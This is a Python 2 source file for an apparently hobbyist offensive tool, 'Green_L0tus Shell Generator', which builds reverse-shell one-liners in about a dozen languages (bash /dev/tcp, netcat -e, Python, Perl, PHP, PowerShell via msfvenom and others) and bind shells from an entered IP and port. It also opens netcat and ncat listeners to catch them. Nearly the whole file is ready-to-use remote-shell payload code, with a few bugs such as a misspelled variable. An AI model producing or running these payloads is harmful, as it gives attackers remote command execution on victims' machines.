import os
import socket
from subprocess import call

# Change tab title
os.system("bash -c 'printf \"\033]0;Green_L0tus Shell Generator\007\";'")

 
header = """\
 _____                       _     _____ _              \n\
|  __ \                     | |   |  _  | |             \n\
| |  \/_ __ ___  ___ _ __   | |   | |/' | |_ _   _ ___  \n\
| | __| '__/ _ \/ _ \ '_ \  | |   |  /| | __| | | / __| \n\
| |_\ \ | |  __/  __/ | | | | |___\ |_/ / |_| |_| \__ \ \n\
 \____/_|  \___|\___|_| |_| \_____/\___/ \__|\__,_|___SHELL \n\
                        ______                            Generator\n\
                       |______|                         \n"""
                                                        

banner = """\
			       \n\
       		.=.A.=.        \n\
          __.=./\ / \ /\.=.__  \n\
         (-.'-;  |   |  ;-'.-) \n\
            \ `\/     \/` /    \n\
             ;  `\pwn/`  ;     \n\
             |    | |    |     \n\
             ;,"-.-"-.-",;     \n\
              \\\/^\ /^\//      \n\
               \   `   /       \n\
                ',___,'        \n\
                 \\\V//         \n\
                  |||          \n\
                  |||          \n\
                  |||          \n\
                               \n"""


 
colors = {
        'blue': '\033[94m',
        'pink': '\033[95m',
        'green': '\033[92m',
	'Red' : '\033[91m',
	'Cyan' : '\033[96m',
	'White' : '\033[97m',
	'Yellow' : '\033[93m',
	'Magenta' : '\033[95m',
	'Grey' : '\033[90m',
        }
 
def colorize(string, color):
    if not color in colors: return string
    return colors[color] + string + '\033[0m'
 


#
# Pre defined variables
#
ipAddress = ''
portNumber = ''
OS = 'cmd.exe'

revshellnum = 0
bindshellnum = 0
#
# TYPES OF SHELLS
#

def reverse():
        while True:
        	os.system('clear')
        	# Print some badass ascii art header here !
        	print colorize('Reverse Shell Languages:', 'pink')
        	#print colorize('version 0.1\n', 'green')
        	for item in rev_languageItems:
            		print colorize("[" + str(rev_languageItems.index(item)) + "] ", 'blue') + item.keys()[0]
        	choice = raw_input("GL>> ")
        	try:
            		if int(choice) < 0 : raise ValueError
            		# Call the matching function
            		rev_languageItems[int(choice)].values()[0]()
        	except (ValueError, IndexError):
            		pass
	
 	
def bind():
	while True:
        	os.system('clear')
        	# Print some badass ascii art header here !
        	print colorize('Bind Shell Languages: \n', 'pink')
        	#print colorize('version 0.1\n', 'green')
        	for item in bind_languageItems:
            		print colorize("[" + str(bind_languageItems.index(item)) + "] ", 'blue') + item.keys()[0]
        	choice = raw_input("GL>> ")
        	try:
            		if int(choice) < 0 : raise ValueError
            		# Call the matching function
            		bind_languageItems[int(choice)].values()[0]()
        	except (ValueError, IndexError):
            		pass

# To-Do: Use screen to manage connections. 
def connect():
	while True:
		os.system('clear')
		# Print some badass ascii art header here !
		print colorize('Connect to host or spawn listener: \n', 'pink')
		#print colorize('version 0.1\n', 'green')
		for item in spawn_connectItems:
	    		print colorize("[" + str(spawn_connectItems.index(item)) + "] ", 'blue') + item.keys()[0]
		choice = raw_input("GL>> ")
		try:
	    		if int(choice) < 0 : raise ValueError
	    		# Call the matching function
	    		spawn_connectItems[int(choice)].values()[0]()
		except (ValueError, IndexError):
	    		pass



def postShellGen():
	while True:
		#os.system('clear')
		# Print some badass ascii art header here !
		print colorize('Connect to host or spawn listener: \n', 'pink')
		#print colorize('version 0.1\n', 'green')
		for item in spawn_connectItems:
	    		print colorize("[" + str(spawn_connectItems.index(item)) + "] ", 'blue') + item.keys()[0]
		choice = raw_input(">> ")
		try:
	    		if int(choice) < 0 : raise ValueError
	    		# Call the matching function
	    		spawn_connectItems[int(choice)].values()[0]()
		except (ValueError, IndexError):
	    		pass




#------------------------
# LANGUAGE FUNCTIONS
#------------------------

#
# REVERSE SHELL LANGUAGES
#

def rev_bashShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = "bash -i >& /dev/tcp/"+ipAddress+"/"+portNumber+" 0>&1"

	printRevShellString(revShellString)	
	postShellGen()
	#return revShellString

def rev_perlShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = "perl -e 'use Socket;$i=\""+ipAddress+"\";$p="+portNumber+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))"+\
	";if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

	printRevShellString(revShellString)
	postShellGen()
	
	return revShellString

def rev_pythonShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ipAddress+\
	"\","+portNumber+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	printRevShellString(revShellString)	
	postShellGen()
	return revShellString

def rev_ncShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
        revShellString = "nc -e /bin/sh "+ipAddress+" "+portNumber

        printRevShellString(revShellString)
	postShellGen()
	return revShellString

def enc_rev_ncShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
        revShellString = "ncat -e /bin/sh "+ipAddress+" "+portNumber+ " -vvv --ssl"

        printRevShellString(revShellString)
	postShellGen()
	return revShellString

def rev_phpShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = "php -r '$sock=fsockopen(\""+ipAddress+"\","+portNumber+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

	printRevShellString(revShellString)
	postShellGen()
	return revShellString

def rev_rubyShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	
	revShellString = "ruby -rsocket -e'f=TCPSocket.open(\""+ipAddress+"\","+portNumber+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

	printRevShellString(revShellString)
	postShellGen()
	return revShellString

def rev_javaShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = "r = Runtime.getRuntime()"
	revShellString += "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/"+ipAddress+"/"+portNumber+";cat <&5 | while read line; do \$line"+\
	" 2>&5 >&5; done\"] as String[])"
	revShellString += "p.waitFor()"

	printRevShellString(revShellString)
	postShellGen()
	return revShellString

def rev_xtermShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = "xterm -display "+ipAddress+":"+portNumber

	printRevShellString(revShellString)
	postShellGen()
	return revShellString

def rev_powerShell():
	global ipAddress
	global portNumber
	print "**USE SSL LISTENER FOR POWERSHELL!!!**"
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = os.popen('msfvenom -p cmd/windows/powershell_reverse_tcp LHOST='+ipAddress+' LPORT='+ portNumber).read()
	#revShellString = "$client = New-Object System.Net.Sockets.TCPClient(" + ipAddress + "," + portNumber +");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
	#os.system('msfvenom -p cmd/windows/powershell_reverse_tcp LHOST='+ipAddress+' LPORT='+ portNumber)
	printRevShellString(revShellString)
	postShellGen()
	return revShellString

def rev_nodeJSShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = "(function(){ \n"
	revShellString += "	var net = require(\"net\"), \n"
	revShellString += "		cp = require(\"child_process\"), \n"
	revShellString += "		sh = cp.spawn(\"/bin/sh\", []); \n"
	revShellString += "	var client = new net.Socket();\n"
	revShellString += "	client.connect(" + portNumber + ", " + ipAddress + ", " + "function(){ \n"
	revShellString += "		client.pip(sh.stdin); \n"
	revShellString += "		sh.stdout.pipe(client); \n"
	revShellString += "		sh.stderr.pipe(client); \n"
	revShellString += "	}); \n"
	revShellString += "	return /a/; \n"
	revShellString += "})(); \n"
	
	printRevShellString(revShellString)
	postShellGen()
	return revShellString

def rev_telnetShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = "rm f;mkfifo f; cat f|/bin/sh -i 2>&1|telnet " + ipAddress + " " + portNumber + ">f"
	printRevShellString(revShellString)
	postShellGen()
	return revShellString

def rev_awkShell():
	global ipAddress
	global portNumber
	ipAddress = raw_input("\nEnter IP Address >>")
	portNumber = raw_input("\nEnter port >>")
	revShellString = "awk 'BEGIN {s = \"/inet/tcp/0/" + ipAddress + "/" + portNumber + "\"" + "; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
	printRevShellString(revShellString)
	postShellGen()
	return revShellString



#
# BIND SHELL LANGUAGE Functions
#

# NEED TO IMPLEMENT MORE

def bind_perlShell():
	global portNumber
	portNumber = raw_input("\nEnter port >>")
	bindShellString = """perl -e 'use Socket;$p="""+portNumber+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'"""
	printBindShellString(bindShellString)
	postShellGen()
	return bindShellString

def bind_pythonShell():
	global portNumber
	portNumber = raw_input("\nEnter port >>")
	bindShellString = """python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',"""+portNumber+"""));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"""
	printBindShellString(bindShellString)
	postShellGen()
	return bindShellString

def bind_ncShell():
	global portNumber
	portNumber = raw_input("\nEnter port >>")
        bindShellString = "nc -lvp " + portNumber + " -e /bin/bash"
        printBindShellString(bindShellString)
	postShellGen()
	return bindShellString

def bind_enc_ncatShell():
	print "\nSetup ncat ssl bind shell"
	global portNumber
	portNumber = raw_input("\nEnter port >>")
	connectingIP = raw_input("\nEnter connecting IP >>")
	bindShellString = "ncat.exe -lvp "+ portNumber + " -e cmd.exe --allow "+ connnectingIP + " --ssl"

def bind_phpShell():
	global portNumber
	portNumber = raw_input("\nEnter port >>")
	bindShellString = """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",""" + portNumber + """);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"""
	printBindShellString(bindShellString)
	postShellGen()
	return bindShellString

def bind_rubyShell():
	global portNumber
	portNumber = raw_input("\nEnter port >>")
	bindShellString = """ruby -rsocket -e 'f=TCPServer.new("""+portNumber+""");s=f.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",s,s,s)'"""
	printBindShellString(bindShellString)
	postShellGen()
	return bindShellString






#----------------------------
# Other FUNCTIONS (HELPERS)
#----------------------------



def printRevShellString(revShellString):
	os.system('clear')
	print("\nReverse Shell String\n" + "="*40 + "\n" + revShellString + "\n" + "="*40)

def printBindShellString(bindShellString):
	os.system('clear')
	print("\nBind Shell String\n" + "="*40 + "\n" + bindShellString + "\n" + "="*40)


def spawnListener():
	try:	
		global revshellnum
		revshellnum += 1
		global portNumber
		portNumber = raw_input("\nEnter port >>")
		connectingIP = raw_input("\nEnter connecting ip address (if you dont know leave blank)>>")
		print("\nSpawning the listener on port " + portNumber)
                print("Waiting for connection...\n\n")
		
		shcmd = 'sudo netcat -lvp ' + portNumber
		cmd = "bash -c 'printf \"\033]0;reverse shell @ %s\007\";%s'" % (connectingIP,shcmd)
		os.system('gnome-terminal --tab -- '+cmd)
	except KeyboardInterrupt:
		pass

def sslListener():
	try:
		global portNumber
		portNumber = raw_input("\nEnter port >>")
		connectingIP = raw_input("\nEnter connecting ip address >>")
		print("\nSpawning ssl listener on port " + portNumber)
                print("Waiting for connection...\n\n")
		
		shcmd = 'sudo ncat -lvp ' + portNumber + ' --allow ' + connectingIP + ' --ssl'
		cmd = "bash -c 'printf \"\033]0;reverse ssl shell @ %s\007\";%s'" % (connectingIP,shcmd)

		os.system('gnome-terminal --tab -- ' + cmd)

	except KeyboardInterrupt:
		pass


def bindConnect():
	try:
		global ipAddress
		ipAddress = raw_input("\nEnter Target IP Address: ")
		global portNumber
		portNumber = raw_input("\nEnter port >>")
		print"\nConnecting to host: " + ipAddress + " on port: " + portNumber + "\n"
		shcmd = 'sudo netcat -nv ' + ipAddress + " " + portNumber
		cmd = "bash -c 'printf \"\033]0;bind @ %s\007\";%s'" % (ipAddress,shcmd)
		
		call(['gnome-terminal', '--tab', '-- ', cmd])

	except KeyboardInterrupt:
		pass


def sslBindConnect():
	try:
		global portNumber
		portNumber = raw_input("\nEnter port >>")
		connectingIP = raw_input("\nEnter connecting ip adress >>")
		print("\nSpawning ssl listener on port " + portNumber)
                print("Waiting for connection...\n\n")
		#os.system('sudo ncat -lvp ' + portNumber + '-e cmd.exe --allow ' + connectingIP + ' --ssl')
		shcmd = 'sudo ncat -v ' + connectingIP + " " + portNumber + ' --ssl'
		cmd = "bash -c 'printf \"\033]0;ssl bind @ %s\007\";%s'" % (connectingIP,shcmd)
		call(['gnome-terminal', '--tab', '-- ', cmd])
	except KeyboardInterrupt:
		pass

def back():
	main()


#----------------------------------
#   MENU DEFINITIONS
#   
#----------------------------------
 
menuItems = [
    { "Reverse Shell": reverse },
    { "Bind Shell": bind },
    { "Connect..": connect },
    { "Exit": exit },
]
 
rev_languageItems = [
    { "Linux/Bash	Linux Bash reverse TCP shell": rev_bashShell },
    { "Linux/Perl		Per": rev_perlShell },
    { "Python": rev_pythonShell },
    { "Netcat": rev_ncShell },
    { "Encrypted Ncat (SSL)": enc_rev_ncShell },
    { "PHP": rev_phpShell },
    { "Ruby": rev_rubyShell },    
    { "Java": rev_javaShell },
    { "XTerm": rev_xtermShell },
    { "Windows/Powershell	Powershell reverse tcp shell": rev_powerShell },
    { "node js": rev_nodeJSShell },
    { "Telnet": rev_telnetShell },
    { "AWK": rev_awkShell },
    { "Main Menu": back },
    { "EXIT": exit },
]

bind_languageItems = [
    { "Perl": bind_perlShell },
    { "Python": bind_pythonShell },
    { "Netcat": bind_ncShell },
    { "Ncat SSL": bind_enc_ncatShell },
    { "PHP": bind_phpShell },
    { "Ruby": bind_rubyShell },    
    { "Main Menu": back },
    { "EXIT": exit },
]




spawn_connectItems = [
    { "Listener for Reverse Shell": spawnListener },
    { "Listen for SSL Reverse Shell" : sslListener },
    { "Connect to Bind Shell": bindConnect },    
    { "Connect to SSL Bind Shell" : sslBindConnect },
    { "Main Menu": back },
    { "EXIT": exit },
]


#----------------------
# MENU
#
#----------------------



def main():
    while True:
        os.system('clear')
        # Print some badass ascii art header here !
        print colorize(header, 'green')
	print colorize("Generate and connect to shells", 'Red')
        print colorize('VERSION 0.0.1    AKA Green_L0tus\n', 'Yellow')
        for item in menuItems:
            print colorize("[" + str(menuItems.index(item)) + "] ", 'blue') + item.keys()[0]
        choice = raw_input("GL>> ")
        try:
            if int(choice) < 0 : raise ValueError
            # Call the matching function
            menuItems[int(choice)].values()[0]()
        except (ValueError, IndexError):
            pass
 
if __name__ == "__main__":
    main()
